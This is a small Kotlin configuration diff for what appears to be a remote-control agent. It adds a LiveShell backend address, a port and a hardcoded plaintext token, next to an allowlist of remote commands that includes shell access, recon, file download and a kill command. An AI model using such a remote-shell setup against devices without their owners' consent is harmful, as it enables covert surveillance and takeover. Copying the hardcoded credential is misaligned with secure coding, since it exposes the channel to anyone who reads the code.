@@ -16,6 +16,11 @@ object Config {
     const val HEARTBEAT_INTERVAL_MS = 60000L
     const val MAX_COMMAND_AGE_MS = 5 * 60 * 1000L // 5 minutes — ignore stale commands
 
+    // LiveShell backend URL — change to your desktop IP for LAN or tunnel domain for WAN
+    const val LIVESHELL_HOST = "192.168.1.15"
+    const val LIVESHELL_PORT = 8000
+    const val LIVESHELL_TOKEN = "LiveShell2026!"
+
     val ALLOWED_COMMANDS = setOf(
         "info", "apps", "shell", "battery", "files", "wifi", "recon", "download", "die", "liveshell"
     )
